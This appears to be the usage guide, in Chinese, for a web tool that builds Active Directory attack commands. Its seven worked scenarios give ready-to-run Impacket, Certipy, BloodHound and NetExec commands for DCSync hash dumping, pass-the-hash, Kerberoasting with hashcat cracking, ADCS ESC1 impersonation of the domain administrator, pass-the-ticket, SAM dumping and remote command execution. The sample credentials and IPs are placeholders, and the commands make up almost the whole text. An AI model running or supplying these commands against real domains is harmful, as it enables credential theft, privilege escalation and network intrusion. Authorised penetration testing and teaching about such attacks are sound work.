# 使用示例 | Usage Examples

## 场景 1: DCSync 攻击

### 1. 填写凭据配置
```
域名: CORP.LOCAL
用户名: administrator
密码: P@ssw0rd123
目标 IP: 192.168.1.10
DC IP: 192.168.1.10
```

### 2. 选择认证方式: **密码**

### 3. 选择工具: **Impacket → secretsdump**

### 4. 生成的命令:
```bash
# DCSync 导出所有域用户哈希
secretsdump.py CORP.LOCAL/administrator:P@ssw0rd123@192.168.1.10 -dc-ip 192.168.1.10 -just-dc
```

---

## 场景 2: Pass-the-Hash + PSExec

### 1. 填写凭据配置
```
域名: CORP.LOCAL
用户名: administrator
NT Hash: a87f3a337d73085c45f9416be5787d86
目标 IP: 192.168.1.100
DC IP: 192.168.1.10
```

### 2. 选择认证方式: **NTLM Hash**

### 3. 选择工具: **Impacket → psexec**

### 4. 生成的命令:
```bash
# PSExec 交互式 Shell
psexec.py CORP.LOCAL/administrator@192.168.1.100 -hashes aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86 -dc-ip 192.168.1.10
```

---

## 场景 3: Kerberoasting

### 1. 填写凭据配置
```
域名: CORP.LOCAL
用户名: lowpriv
密码: User123!
DC IP: 192.168.1.10
目标 IP: 192.168.1.10
```

### 2. 选择认证方式: **密码**

### 3. 选择工具: **Impacket → GetUserSPNs**

### 4. 生成的命令:
```bash
# 列举并请求所有 SPN 票据
GetUserSPNs.py CORP.LOCAL/lowpriv:User123!@192.168.1.10 -dc-ip 192.168.1.10 -request

# 导出到文件供 hashcat 破解
GetUserSPNs.py CORP.LOCAL/lowpriv:User123!@192.168.1.10 -dc-ip 192.168.1.10 -request -outputfile kerberoast_hashes.txt
```

### 5. 破解 (手动)
```bash
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## 场景 4: ADCS ESC1 利用 (Certipy)

### 1. 填写凭据配置
```
域名: CORP.LOCAL
用户名: lowpriv
密码: User123!
DC IP: 192.168.1.10
CA Name: CORP-DC-CA
证书模板: ESC1-Template
```

### 2. 选择认证方式: **密码**

### 3. 选择工具: **Certipy → find**

### 4. 查找漏洞模板:
```bash
certipy find -u lowpriv@CORP.LOCAL -p User123! -dc-ip 192.168.1.10 -vulnerable -stdout
```

### 5. 选择工具: **Certipy → req**

### 6. 申请证书并伪造域管理员:
```bash
certipy req -u lowpriv@CORP.LOCAL -p User123! -dc-ip 192.168.1.10 -ca CORP-DC-CA -template ESC1-Template -upn administrator@CORP.LOCAL
```

### 7. 选择工具: **Certipy → auth**

### 8. 使用证书获取 TGT 和哈希:
```bash
certipy auth -pfx administrator.pfx -dc-ip 192.168.1.10
```

---

## 场景 5: BloodHound 数据采集

### 1. 填写凭据配置
```
域名: CORP.LOCAL
用户名: lowpriv
密码: User123!
DC IP: 192.168.1.10
```

### 2. 选择认证方式: **密码**

### 3. 选择工具: **Kerberos / BloodHound → BloodHound**

### 4. 生成的命令:
```bash
# BloodHound Python 采集器
bloodhound-python -u lowpriv -p User123! -d CORP.LOCAL -ns 192.168.1.10 -c All --zip
```

### 5. 或使用 NetExec:
选择工具: **NetExec → NetExec LDAP**
```bash
# NetExec LDAP BloodHound 数据采集
nxc ldap 192.168.1.10 -u lowpriv -d CORP.LOCAL -p User123! --bloodhound -c All
```

---

## 场景 6: Pass-the-Ticket (Kerberos)

### 1. 获取 TGT
填写凭据配置，选择工具 **Kerberos 工具 → getTGT**

```bash
getTGT.py CORP.LOCAL/administrator -hashes :a87f3a337d73085c45f9416be5787d86 -dc-ip 192.168.1.10
```

### 2. 设置环境变量
选择工具 **Kerberos 工具 → 导出 TGT 环境变量**

```bash
export KRB5CCNAME=administrator.ccache
```

### 3. 使用 Kerberos 认证
切换认证方式为 **Kerberos**，选择工具 **Impacket → psexec**

```bash
psexec.py CORP.LOCAL/administrator@192.168.1.100 -k -no-pass -dc-ip 192.168.1.10
```

---

## 场景 7: NetExec 横向移动

### 1. 填写凭据配置
```
域名: CORP.LOCAL
用户名: administrator
NT Hash: a87f3a337d73085c45f9416be5787d86
目标 IP: 192.168.1.100
```

### 2. 选择认证方式: **NTLM Hash**

### 3. 选择工具: **NetExec → NetExec SMB**

### 4. 生成的命令:
```bash
# SMB 基础枚举
nxc smb 192.168.1.100 -u administrator -d CORP.LOCAL -H a87f3a337d73085c45f9416be5787d86

# 枚举共享
nxc smb 192.168.1.100 -u administrator -d CORP.LOCAL -H a87f3a337d73085c45f9416be5787d86 --shares

# 导出本地 SAM
nxc smb 192.168.1.100 -u administrator -d CORP.LOCAL -H a87f3a337d73085c45f9416be5787d86 --sam

# 执行命令
nxc smb 192.168.1.100 -u administrator -d CORP.LOCAL -H a87f3a337d73085c45f9416be5787d86 -x "whoami"
```

---

## 提示 Tips

1. **占位符高亮** - 如果命令中出现黄色的 `<PLACEHOLDER>`，说明该字段未填写，补全后占位符会自动替换为实际值。

2. **认证方式切换** - 切换认证方式后，所有命令的 flag 会自动调整（如 `-hashes`、`-k`、`-aesKey`）。

3. **localStorage 持久化** - 填写的配置会自动保存到浏览器本地存储，刷新页面不会丢失。

4. **一键复制** - 每条命令右上角的「复制」按钮可快速复制完整命令到剪贴板。

5. **搜索过滤** - 左侧搜索框可快速过滤工具名称和描述。

6. **多场景复用** - 同一套凭据配置可生成数十条不同工具的命令，无需重复输入。
